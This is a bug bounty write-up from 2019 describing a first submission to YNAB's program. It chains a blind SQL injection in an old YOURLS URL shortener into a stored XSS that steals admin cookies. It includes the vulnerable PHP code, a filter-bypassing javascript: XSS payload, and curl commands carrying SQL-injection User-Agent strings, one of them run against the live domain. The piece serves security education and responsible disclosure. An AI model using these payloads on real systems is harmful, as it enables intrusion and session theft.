---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-01-08_tips-for-bug-bounty-beginners-from-a-real-life-experience.md
original_filename: 2019-01-08_tips-for-bug-bounty-beginners-from-a-real-life-experience.md
title: Tips for bug bounty beginners from a real life experience
category: documents
detected_topics:
- xss
- sqli
- sso
- idor
- command-injection
- rate-limit
tags:
- imported
- documents
- xss
- sqli
- sso
- idor
- command-injection
- rate-limit
language: en
raw_sha256: ed2865233db853b6e0cda470d7dca0a2e1a918ada59d93b311c30a89bbba0da1
text_sha256: f9af90619502e18b392a9dd102e0d8a91ba35b894a7e635019d6f792724114e5
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Tips for bug bounty beginners from a real life experience

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-01-08_tips-for-bug-bounty-beginners-from-a-real-life-experience.md
- Source Type: markdown
- Detected Topics: xss, sqli, sso, idor, command-injection, rate-limit
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `ed2865233db853b6e0cda470d7dca0a2e1a918ada59d93b311c30a89bbba0da1`
- Text SHA256: `f9af90619502e18b392a9dd102e0d8a91ba35b894a7e635019d6f792724114e5`


## Content

---
title: "Tips for bug bounty beginners from a real life experience"
page_title: "Tips for bug bounty beginners from a real life experience - Renaud Martinet"
url: "https://renaudmarti.net/posts/first-bug-bounty-submission/"
final_url: "https://renaudmarti.net/posts/first-bug-bounty-submission/"
authors: ["Renaud Martinet (@karouf)"]
programs: ["YNAB"]
bugs: ["XSS", "SQL injection"]
bounty: "1,500"
publication_date: "2019-01-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5482
---

Security

# Tips for bug bounty beginners from a real life experience

January 08, 2019 14 min read By Renaud Martinet

I’ve been aware of bug bounties for a few years now but never really felt I was capable of participating.

![Yes I'm that confident](/media/images/first-bug-bounty/the-imposter-syndrome-is-strong-with-this-one.jpg)

I’ve been training my skills on [Hack The Box](https://www.hackthebox.eu/) and [RootMe](https://www.root-me.org/?lang=en) for a while but figured that if I was to spend that much time on it I might as well get paid.  
And guess what? I found a good vuln in my first week. Take that imposter syndrom.

In this post I want to use my first discovery as a way to show that if you are interested in security and have some background in IT, you can probably do it too.  
To be clear: this is not an overly technical post. It aims to emphasize the workflow and the attitude first and foremost. The technical details are just there for the sake of completeness. The Internet is full of good documentation about XSS and whatnots anyway.

So I began looking for a bug bounty program that would be familiar and found that [YNAB](https://www.youneedabudget.com/) had one. Great! I’ve been using their apps for years. It’s not a huge company so it wouldn’t feel too intimidating. There’s probably not too much people working on it as well: I felt I had a chance to find something. Also the scope is pretty open and the rewards for P1 bugs (the highest criticity) are fair.  
I tried to stack the deck in my favor as much as I could.  
Now it was time to get going.

## Recon recon recon

To be honest, I didn’t really have a methodology yet. I read stuff from Jason Haddix and others but basically that’s it.  
On Hack the Box, I only had one IP to attack. There I had a wildcard domain, a staging app and a small note saying that any domain confirmed to be owned by YNAB was fair game.  
That meant a lot more recon than I’m used to.  
Though I didn’t want to skimp on it because I knew that’s the way you find interesting things others don’t.

> Always be enumerating  
>  If you don’t find anything, enumerate more.

I started by setting up BurpSuite to spider the main website.  
While it was running, I tried to enumerate subdomains with `amass` and see if I could find anything worth a look.  
Not much sadly. I’d just read about subdomain takeovers and was secretly hoping to stumble upon one.

Anyway I went back to BurpSuite to check all the URLs it found and then I came across an interesting one: `http://ynab.me/admin`.  
I had a look and found out it was a domain they were using for URL shortening. It was using an old version of [YOURLS](http://yourls.org/), probably a good place to find vulnerabilities. The fact that it’s open source made it easier.

Before going further, I wanted to make sure that YNAB owned `ynab.me`.  
A `whois` query confirmed that it was registered to **You Need A Budget LLC** and I was good to go explore YOURLS source code.

**Know the scope of the program!**  
It will save you some time digging in out of scope items and getting submissions rejected later on.

## Hunting bugs

I started by checking the Github issues to see if by chance somebody already did the work for me. I found that some SQL injections and XSS had been reported a while ago. The issues were redacted but I still gained some knowledge of what to look out for. Next I dove into the source code looking for SQL queries that would use unsanitized user input and quickly found out that a SQL injection was possible through the analytics feature. Basically it was logging every hit and recording various informations about it in the database. One of them, the `User-Agent` header, wasn’t sanitized much before being stored:
  
  
  // Log a redirect (for stats)
  function yourls_log_redirect( $keyword ) {
  if ( !yourls_do_log_redirect() )
  return true;
  global $ydb;
  $table = YOURLS_DB_TABLE_LOG;
  
  $keyword = yourls_sanitize_string( $keyword );
  $referrer = ( isset( $_SERVER['HTTP_REFERER'] ) ? yourls_sanitize_url( $_SERVER['HTTP_REFERER'] ) : 'direct' );
  $ua = yourls_get_user_agent();
  $ip = yourls_get_IP();
  $location = yourls_geo_ip_to_countrycode( $ip );
  
  return $ydb->query( "INSERT INTO `$table` VALUES ('', NOW(), '$keyword', '$referrer', '$ua', '$ip', '$location')" );
  }
  
  
  
  // Returns a sanitized a user agent string. Given what I found on http://www.user-agents.org/ it should be OK.
  function yourls_get_user_agent() {
  if ( !isset( $_SERVER['HTTP_USER_AGENT'] ) )
  return '-';
  
  $ua = strip_tags( html_entity_decode( $_SERVER['HTTP_USER_AGENT'] ));
  $ua = preg_replace('![^0-9a-zA-Z\':., /{}\(\)\[\]\+@&\!\?;_\-=~\*\#]!', '', $ua );
  
  return substr( $ua, 0, 254 );
  }
  

As I didn’t want to run anything against YNAB infrastructure right away, I used the Dockerfile provided in the [docker-yourls](https://hub.docker.com/_/yourls) repository and modified it to work with version 1.4.3. Now I had a local instance I could wreak without worrying.  
A few attempts at the SQLi and I was running `SLEEP(5)` on the MySQL DB. Since it occured in an `INSERT` statement, it somewhat limited what I could do with it:

  * read any data in the DB and possibly other DBs if user privileges allow it
  * insert new records in the `yourls_log` table
  * update existing records in the `yourls_log` table

To illustrate the first method, I managed to get the MySQL version: `5.6`. I could leak the entire DB but:

  * there was nothing really interesting in it: mainly analytics logs.
  * it would be so sloooow since it was using a time-based blind SQL injection.

YOURLS stores the credentials to access the admin panel in a separate file on disk. A good idea in this case. Otherwise I’d have admin access straight away.

I was left with what was technically a P1 bug but it didn’t have much impact for YNAB.

I was worried my report could be rejected or the criticity could be downgraded because of the lack of impact. Also I felt I was on a roll and could do better so I kept looking.  
I tried to find analytics data that was echoed back somewhere in the admin UI to get some stored XSS on the admin panel. I found that for each shortened URL, a page displays all the referers that linked to it.  
What it does is that when a user visits a shortened URL, YOURLS logs the `Referer` header, sanitizes it and stores it in the DB. When the admin looks at the stats page for that shortened URL, it displays a summary of all referers as links like so:
  
  
  <a href="http://referer.com/">http://referer.com/</a>
  

In that case, `http://referer.com/` comes from the DB.

Before being stored though it is filtered by YOURLS. Here are the 3 functions responsible for that:
  
  
  // A few sanity checks on the URL
  function yourls_sanitize_url($url) {
  // make sure there's only one 'http://' at the beginning (prevents pasting a URL right after the default 'http://')
  $url = str_replace('http://http://', 'http://', $url);
  // make sure there's a protocol, add http:// if not
  if ( !preg_match('!^([a-zA-Z]+://)!', $url ) )
  $url = 'http://'.$url;
  
  $url = yourls_clean_url($url);
  
  return substr( $url, 0, 1999 );
  }
  
  // Function to filter all invalid characters from a URL. Stolen from WP's clean_url()
  function yourls_clean_url( $url ) {
  $url = preg_replace('|[^a-z0-9-~+_.?#=!&;,/:%@$\|*\'"()\\x80-\\xff]|i', '', $url );
  $strip = array('%0d', '%0a', '%0D', '%0A');
  $url = yourls_deep_replace($strip, $url);
  $url = str_replace(';//', '://', $url);
  $url = str_replace('&amp;', '&', $url); // Revert & not to break query strings
  
  return $url;
  }
  
  // Perform a replacement while a string is found, eg $subject = '%0%0%0DDD', $search ='%0D' -> $result =''
  // Stolen from WP's _deep_replace
  function yourls_deep_replace($search, $subject){
  $found = true;
  while($found) {
  $found = false;
  foreach( (array) $search as $val ) {
  while(strpos($subject, $val) !== false) {
  $found = true;
  $subject = str_replace($val, '', $subject);
  }
  }
  }
  
  return $subject;
  }
  

To sum up, it:

  * checks that the referer URL starts with a protocol handler like `http://` or `ftp://`
  * removes any character not in `a-z0-9-~+_.?#=!&;,/:%@$\|*\'"()\\x80-\\xff`
  * removes `\n` and `\r` new line characters

After a lot of trial and error, I ended up with this payload:
  
  
  javascript://%e2%80%a8alert(document.cookie);
  

It’s a bit cryptic, so here is how it works: `javascript:` is a URI scheme indicating to the browser that the rest of the string is Javascript. `//` starts a comment in Javascript. `%e2%80%a8` is an URL encoded Unicode line separator. It is interpreted as a new line by Javascript but sneaks by the filter untouched. `alert(document.cookie);` is the actual payload.

So when the user clicks the link, the following Javascript is executed:
  
  
  //
  alert(document.cookie);
  

Finally! I got it working! It took me some time but I felt really good having been persistent and ending up successful.  
Then reality came crashing the party…  
Truth is, the link is ugly and nobody in their right mind would ever dare clicking on it.  
I was happy to have found a way to get a XSS but no chance I’d get a good payout with that.

## Facepalm

I was a bit down to be honest… But I kept thinking about it and after a while I just realized I had everything I needed already!  
The SQL injection allowed me to insert new records in `yourls_log`. So I could write to the `referrer` column without being constrained by the filter on the `Referer` header because the `User-Agent` header is pretty much left alone.  
I could then store a payload like `<script>alert(document.cookie);</script>` directly in the DB and it would execute on page load so no weird link to click.  
Instant pwn. Great!  
Now I had something solid: SQLi to stored XSS to admin cookies leak. Reads like a skateboard trick and is at least as cool! I think :)

In the end the payload looked like this:
  
  
  $ curl http://yourls.local/ozh -H "User-Agent: test', '', ''), ('', NOW(), 'ozh', concat(char(60), 'script', char(62), 'alert(document.cookie);', char(60), '/script', char(62)), '', '', '') #"
  

## Checking the target

As you can see above, I needed a valid short URL to trigger the SQLi because YOURLS doesn’t log anything in the DB for invalid ones.  
You’d probably think that I’d have make sure I could trigger the SQLi before going further. You’d be right but I was, well… excited and thinking somehow ended up on the back burner.  
Now all I did before could be for nothing if I couldn’t get my hands on some short URL from the `ynab.me` domain. For all I know they hadn’t been using it for a few years and none of the short links wasn’t up anymore…  
A quick search in Google with `site:ynab.me` instantly reassured me: there was plenty of results for that.  
I only checked for the SQLi because I didn’t want to pollute their analytics. The test I did is the following:
  
  
  $ time curl http://ynab.me/contactus
  
  
  real  0m0.901s
  user  0m0.027s
  sys 0m0.037s
  $ time curl http://ynab.me/contactus -H "User-Agent: test' or SLEEP(10) or '"
  
  
  real  0m10.431s
  user  0m0.026s
  sys 0m0.040s
  

It confirmed the vulnerability on `ynab.me`.

**Fixed**  
Following my report, YNAB has upgraded YOURLS to the latest version which is not vulnerable anymore. In fact the YOURLS team has refactored the code handling DB queries to use binded parameters so they should be safe from now on.

## (Please) Show me the money!

Next I had to write the report to submit to YNAB and hopefully get rewarded.  
Honestly I probably overdid it as I wanted to make sure it wouldn’t be dismissed and I got my payout. So I almost spent 2h writing it and finally I submitted it on Bugcrowd.  
Then I just had to wait. And wait. More.  
Frankly waiting is the worst. Especially as it was my first submission, I was anxious to get an answer from the security team. Is it a duplicate? Is it valid? Damn! Waiting was killing me.  
Everytime I got an email I wished it was from Bugcrowd.  
So after 12 days without news, I added a quick comment to ask if they needed any more info from me.  
The following day it was triaged by the Bugcrowd team and they informed me that it was under further review by YNAB. Good they didn’t forget me!  
The day after, the YNAB team had reviewed the bug, confirmed the criticity and was awarding me a sweet $1500 reward.

**Security team are busy**  
But they want to improve security as much as you do. So be patient and don’t pester them everyday to get your reward. You will probably deal with them more than once and want them to be on your side.

Needless to say that I was ecstatic. In fact describing my attitude as “like a kid at Christmas” is probably quite close to the truth.  
Of course I’m grateful for the reward, but what I’m really happy about is that it’s kind of telling me that I can do that, that I’m capable. And that’s probably the best part about it. Also making some dough on the side will obviously come in handy.

## Lessons learnt

As I see it, I’ve been lucky to stumble upon that old YOURLS instance but I had to really work to get a P1 out of it. To put luck on your side, be methodical in your enumeration and be ready to spend a lot of time on it and on exploitation if needed. Also:

  * Security people are busy but nice, don’t pester them.
  * Be thorough, people will miss stuff sometimes.
  * When in doubt, enumerate.
  * Take a step back to see what you have and what you can do with it.
  * Don’t rush submitting any vuln you find if it’s not P1 or P2. Maybe you can chain them with some others to get a P1 or P2.
  * Same if you feel the impact is not there.
  * Enumerate more.
  * Follow user input trail or work backwards from known vulnerable patterns you may find.
  * Luck plays a part.
  * Be persistent.
  * You can do this!

At that point I’m probably going to cancel my Hack The Box subscription (no hard feelings, it’s a great platform to learn), invest a bit in some tooling (mainly automation, maybe a BurpSuite license) and focus all my side-hustle time on bug bounties.  
I see it as a great way to build some reputation for people without any hard credentials like me. Maybe a way to get your foot in the door of the infosec industry.

[Bug bounty](/tags/#bug-bounty) [Write-Up](/tags/#write-up) [Tips](/tags/#tips)
